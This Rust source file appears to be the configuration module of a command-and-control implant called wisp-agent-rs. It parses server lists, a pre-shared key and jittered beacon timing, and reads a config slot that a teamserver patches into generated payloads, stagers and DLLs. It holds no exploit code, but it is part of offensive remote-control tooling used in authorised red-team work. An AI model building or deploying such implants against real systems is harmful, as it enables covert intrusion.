// Agent configuration: JSON file in dev, sentinel slot in generated payloads
// (shared/protocol/payload.go). `WISPCFG\x01` + u16 LE length + JSON + zeros.
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::profile::Profile;

pub const CFG_SLOT_SIZE: usize = 4096;
const CFG_MAGIC: [u8; 8] = *b"WISPCFG\x01";
const CFG_HEADER: usize = 10;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Config {
    #[serde(default)]
    pub servers: Vec<String>,
    #[serde(default)]
    pub psk: String,
    #[serde(default)]
    pub path: Option<String>,
    #[serde(default)]
    pub profile: Option<Profile>,
    #[serde(default = "default_sleep")]
    pub sleep_ms: i64,
    #[serde(default)]
    pub jitter_pct: i64,
    #[serde(default)]
    pub insecure: bool,
    #[serde(default)]
    pub plugin_pubkey: String,
}

fn default_sleep() -> i64 {
    5000
}

impl Config {
    pub fn finalize(&mut self) -> Result<(), String> {
        if self.servers.is_empty() {
            return Err("config: no servers".into());
        }
        let mut profile = self.profile.take().unwrap_or_else(Profile::generic);
        if let Some(p) = &self.path {
            if !p.is_empty() {
                profile.uris = vec![p.clone()];
            }
        }
        profile.finalize();
        self.profile = Some(profile);
        if self.sleep_ms < 10 {
            self.sleep_ms = 3000;
        }
        if !(0..=100).contains(&self.jitter_pct) {
            self.jitter_pct = 30;
        }
        Ok(())
    }

    pub fn load(path: &str) -> Result<Self, String> {
        let raw = std::fs::read(path).map_err(|e| format!("config: {e}"))?;
        let mut cfg: Config = serde_json::from_slice(&raw).map_err(|e| format!("config: {e}"))?;
        cfg.finalize()?;
        Ok(cfg)
    }

    #[cfg(feature = "embedded-slot")]
    pub fn embedded() -> Option<Self> {
        let exe = std::env::current_exe().ok()?;
        let image = std::fs::read(exe).ok()?;
        let slot = find_cfg_slot(&image).ok()??;
        Self::from_slot_value(slot)
    }

    // DLLs cannot locate their image via current_exe (that is rundll32.exe);
    // the patched static below is already mapped into the process.
    #[cfg(feature = "embedded-slot")]
    pub fn embedded_from_slot() -> Option<Self> {
        let slot = find_cfg_slot(&WISP_CFG_SLOT).ok()??;
        Self::from_slot_value(slot)
    }

    #[cfg(not(feature = "embedded-slot"))]
    pub fn embedded_from_slot() -> Option<Self> {
        None
    }

    #[cfg(feature = "embedded-slot")]
    fn from_slot_value(slot: Value) -> Option<Self> {
        if slot
            .get("staged")
            .and_then(Value::as_str)
            .is_some_and(|s| !s.is_empty())
        {
            return None; // stager payload, not an agent
        }
        let psk = slot.get("psk").and_then(Value::as_str).unwrap_or("");
        if psk.is_empty() {
            return None;
        }
        let servers = slot
            .get("servers")
            .and_then(Value::as_array)?
            .iter()
            .filter_map(Value::as_str)
            .map(str::to_string)
            .collect();
        let mut cfg = Config {
            servers,
            psk: psk.to_string(),
            path: slot.get("path").and_then(Value::as_str).map(str::to_string),
            profile: slot
                .get("profile")
                .and_then(|v| serde_json::from_value::<Profile>(v.clone()).ok()),
            sleep_ms: slot.get("sleep_ms").and_then(Value::as_i64).unwrap_or(5000),
            jitter_pct: slot.get("jitter_pct").and_then(Value::as_i64).unwrap_or(0),
            insecure: slot.get("insecure").and_then(Value::as_bool).unwrap_or(false),
            plugin_pubkey: slot
                .get("plugin_pubkey")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string(),
        };
        cfg.finalize().ok()?;
        Some(cfg)
    }

    pub fn effective_sleep(&self) -> u64 {
        effective_sleep(self.sleep_ms, self.jitter_pct)
    }
}

pub fn effective_sleep(base_ms: i64, jitter_pct: i64) -> u64 {
    use rand::Rng;
    if jitter_pct <= 0 {
        return base_ms.max(10) as u64;
    }
    let delta = base_ms as f64 * jitter_pct as f64 / 100.0;
    let v = base_ms as f64 + (rand::thread_rng().gen::<f64>() * 2.0 - 1.0) * delta;
    v.max(10.0) as u64
}

#[cfg(feature = "embedded-slot")]
fn mix(x: u32) -> u32 {
    let mut h = x;
    h ^= h >> 16;
    h = h.wrapping_mul(0x7feb_352d);
    h ^= h >> 15;
    h = h.wrapping_mul(0x846c_a68b);
    h ^= h >> 16;
    h
}

// The compile-time sentinel is the patch target: keep all 4096 bytes zero
// except the magic so the teamserver can overwrite it in place. #[no_mangle]
// makes it an externally-visible root so LTO cannot const-fold the slot away
// (a plain #[used] static gets inlined into an immediate and disappears).
// Only the `embedded-slot` feature (standalone agent + stager) keeps it; the
// staged core DLL must not carry a WISPCFG marker in its image.
#[cfg(feature = "embedded-slot")]
#[used]
#[no_mangle]
pub static WISP_CFG_SLOT: [u8; CFG_SLOT_SIZE] = make_slot();

#[cfg(feature = "embedded-slot")]
const fn make_slot() -> [u8; CFG_SLOT_SIZE] {
    let mut s = [0u8; CFG_SLOT_SIZE];
    s[0] = b'W';
    s[1] = b'I';
    s[2] = b'S';
    s[3] = b'P';
    s[4] = b'C';
    s[5] = b'F';
    s[6] = b'G';
    s[7] = 1;
    s
}

// black_box keeps this a real load from the symbol instead of an inlined
// constant; the value is never used for anything.
#[cfg(feature = "embedded-slot")]
pub fn anchor() -> u8 {
    std::hint::black_box(&WISP_CFG_SLOT)[std::hint::black_box(mix(0) as usize % CFG_SLOT_SIZE)]
}

pub fn find_cfg_slot(image: &[u8]) -> Result<Option<Value>, String> {
    let mut found: Option<Value> = None;
    let mut saw_marker = false;
    let mut i = 0;
    while i + CFG_MAGIC.len() <= image.len() {
        let Some(off) = find_bytes(&image[i..], &CFG_MAGIC) else {
            break;
        };
        let pos = i + off;
        saw_marker = true;
        i = pos + CFG_MAGIC.len();
        if pos + CFG_SLOT_SIZE > image.len() {
            continue;
        }
        let slot = &image[pos..pos + CFG_SLOT_SIZE];
        let n = u16::from_le_bytes([slot[8], slot[9]]) as usize;
        if n == 0 || n > CFG_SLOT_SIZE - CFG_HEADER {
            continue;
        }
        let json = &slot[CFG_HEADER..CFG_HEADER + n];
        if slot[CFG_HEADER + n..].iter().any(|&b| b != 0) {
            continue;
        }
        let Ok(v) = serde_json::from_slice::<Value>(json) else {
            continue;
        };
        if found.is_some() {
            return Err("protocol: multiple sentinel slots in binary".into());
        }
        found = Some(v);
    }
    if found.is_some() {
        Ok(found)
    } else if saw_marker {
        Err("protocol: malformed sentinel slot".into())
    } else {
        Ok(None)
    }
}

fn find_bytes(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len()).position(|w| w == needle)
}

pub fn load_from_args() -> Result<Config, String> {
    let mut args = std::env::args().skip(1);
    let mut path: Option<String> = None;
    while let Some(a) = args.next() {
        match a.as_str() {
            "-config" | "--config" => path = args.next(),
            "-h" | "--help" => {
                println!("usage: wisp-agent-rs [-config agent.json]");
                std::process::exit(0);
            }
            other => {
                if !other.starts_with('-') {
                    path = Some(other.to_string());
                }
            }
        }
    }
    if let Some(p) = path {
        Config::load(&p)
    } else {
        load_embedded()
    }
}

// Configuration priority for exe/DLL/service entry points: WISPCFG (path or
// inline JSON, development only), then the patched image slot.
pub fn load_for_agent() -> Result<Config, String> {
    if let Ok(raw) = std::env::var("WISPCFG") {
        let raw = raw.trim();
        if !raw.is_empty() {
            if raw.starts_with('{') {
                let mut cfg: Config = serde_json::from_str(raw)
                    .map_err(|e| format!("config: WISPCFG: {e}"))?;
                cfg.finalize()?;
                return Ok(cfg);
            }
            return Config::load(raw);
        }
    }
    load_embedded()
}

#[cfg(feature = "embedded-slot")]
fn load_embedded() -> Result<Config, String> {
    if let Some(c) = Config::embedded_from_slot() {
        return Ok(c);
    }
    Config::embedded().ok_or_else(|| {
        "no config file and no embedded slot — pass -config or run a patched payload".into()
    })
}

#[cfg(not(feature = "embedded-slot"))]
fn load_embedded() -> Result<Config, String> {
    Err("no config file — pass -config (this build has no embedded slot)".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(feature = "embedded-slot")]
    #[test]
    fn sentinel_slot_is_unique_and_empty() {
        let image = std::fs::read(std::env::current_exe().unwrap()).unwrap();
        let cfg = find_cfg_slot(&image);
        // Test binaries include the slot but no patched JSON: valid marker with
        // an empty length is "malformed", which is the expected unpatched state.
        assert!(matches!(cfg, Ok(None) | Err(_)));
    }

    #[test]
    fn patched_slot_roundtrip() {
        let mut img = vec![0u8; 8192];
        img[100..108].copy_from_slice(&CFG_MAGIC);
        let json = br#"{"servers":["http://x"],"psk":"p","sleep_ms":1000}"#;
        img[108..110].copy_from_slice(&(json.len() as u16).to_le_bytes());
        img[110..110 + json.len()].copy_from_slice(json);
        let v = find_cfg_slot(&img).unwrap().unwrap();
        assert_eq!(v["psk"], "p");
    }
}
